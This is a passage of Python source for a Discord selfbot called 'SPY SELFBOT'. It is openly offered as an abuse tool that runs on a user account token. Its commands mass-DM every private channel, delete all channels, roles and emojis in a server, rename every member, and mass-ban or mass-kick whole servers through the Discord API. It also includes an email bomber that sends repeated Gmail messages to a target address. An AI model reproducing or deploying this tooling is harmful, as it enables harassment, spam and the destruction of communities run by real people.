        
            embed=discord.Embed(title=f"SPY SELFBOT", description=f"Success | Left Server : `{servid}`")
            embed.set_footer(text="Created by RisinPlayX")
            await ctx.send(embed=embed)


        else:
            embed=discord.Embed(title=f"SPY SELFBOT", description=f"Error | Error leaving server : `{servid}`\nMessage : {leave.text}")
            embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/815985203436322876/a_f05e7cb6fe59b130f1e1efe26193751a.gif")
            embed.set_footer(text="Created by RisinPlayZ")
            await ctx.send(embed=embed)
    
@SPYSBOP.command()
async def massdm(ctx, *, x):
	await ctx.send("**SPY SELFBOT**\n> MASS DM")
	for channel in SPYSBOP.private_channels:
		try:
			await channel.send(x)
			await ctx.send(f"**SPY SELFBOT | MASS DM** > {channel}")
		except:
			continue 
			
@SPYSBOP.command(name='disableCommunityMode', aliases=['dCM', 'dCommunityMode'])
async def disableCommunityMode(ctx):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})

@SPYSBOP.command(aliases=["deletechannels"])
async def delchannels(ctx):
   
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return 
          
@SPYSBOP.command(aliases=["deleteroles"])
async def delroles(ctx):
 
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            return 
    
@SPYSBOP.command(aliases=["deleteemojis"])
async def delemojis(ctx):
   
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            return 
          
@SPYSBOP.command()
async def decode(ctx, string):
     
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@SPYSBOP.command(aliases=['id', 'userid',"useridtoname"])
async def idtoname(ctx, personsid: int):
    if len(str(personsid)) != 18:
        await ctx.send(content = f"**SPY SELFBOT** | >id 822466294032367636")    
    else:
        user = await SPYSBOP.fetch_user(personsid)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="SPY SELFBOT | ID TO USERNAME", description=f"ID [{str(personsid)}]  = `{user.name}#{user.discriminator}`")
  
        embed.set_footer(text="Created by RisinPlayZ")
        await ctx.send(content="",embed=embed) 
     
@SPYSBOP.command()
async def nickall(ctx, *, name="RisinPlayZ OP"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 
    
@SPYSBOP.command()
async def banalltest(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"[+] Banned {member}")
            num += 1
        except:
            print(f"[-] Could not ban {member}")
    print(f"\n[+] Finished banning, successfully banned {1} users") 

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('SPY SELFBOT | Your temp Gmail: ')
    password = input('SPY SELFBOT | Your temp Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}error: {Fore.RED} Incorrect Password or gmail, make sure you've enabled less-secure apps access in your Gmail Account security settings."+Fore.RESET)
    target = input('SPY SELFBOT | Target Gmail: ')
    message = input('SPY SELFBOT | Message to send: ')
    counter = eval(input('SPY SELFBOT | Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

@SPYSBOP.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx):
  
    GmailBomber() 
   
@SPYSBOP.command()
async def email(ctx,count=None,bomb_email=None,*,message=None):
    if count == None or bomb_email == None or message == None:
        await ctx.send("Format - !email [count] [email] [message] - e.g !email 10 email@email.com hii!")
    else:
        x = int(count)
    if x > 100:
        await ctx.send("`That's a lot of spam. Do 100 or less!`")
    else:
        currentDT = datetime.datetime.now()
        hour = str(currentDT.hour)
        minute = str(currentDT.minute)
        second = str(currentDT.second)
        print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} [Command used] - {ctx.author.name}#{ctx.author.discriminator}:{Fore.RESET} !email {count} {bomb_email} {message}")
        counting = int(0)
        embed=discord.Embed(title=f"{counting}/{count}")
        embed.set_author(name="Email sent!")
        
        embed.add_field(name=f'Sending "{message}"', value=f'**to {bomb_email}**', inline=False)
        embed.set_footer(text="Created by RisinPlayZ")
        msg = await ctx.send(embed=embed)
        for i in range(x):
            mail = smtplib.SMTP('smtp.gmail.com',587)
            mail.ehlo()
            mail.starttls()
            mail.login(emale,pas)
            mail.sendmail(emale,bomb_email,message)
            mail.close() 
            currentDT = datetime.datetime.now()
            hour = str(currentDT.hour)
            minute = str(currentDT.minute)
            second = str(currentDT.second)
            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Message Sent:{Fore.RESET} {message} {Fore.GREEN}To {Fore.RESET}{bomb_email}")
            counting = counting + 1 
           
@SPYSBOP.command()
async def massban(ctx, guild):
    guild = guild
    await SPYSBOP.wait_until_ready()
    guildOBJ = SPYSBOP.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('RisinPlayZ/members.txt')
    except:
        pass

    membercount = 0
    with open('RisinPlayZ/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('SPY SELFBOT | MASS BAN INITIATED\nRemoving Members in progress......')
        m.close()
    guild = guild
    print()
    members = open('RisinPlayZ/members.txt')
    for member in members:
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Banned{member.strip()}")
                    break
                else:
                    break

    members.close()

@SPYSBOP.command()
async def masskick(ctx, guild):
    guild = guild
    await SPYSBOP.wait_until_ready()
    guildOBJ = SPYSBOP.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('SPY SELFBOT | MASS KICK INITIATED\nRemoving Members in progress......')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Kicked {member.strip()}")
                    break
                else:
                    break

    members.close()

if token_type == "user":
                SPYSBOP.run(risinencrypt, bot=False)
elif token_type == "bot":
                SPYSBOP.run(risinencrypt)

# SPYSBOP.run(risinencrypt, bot = False)
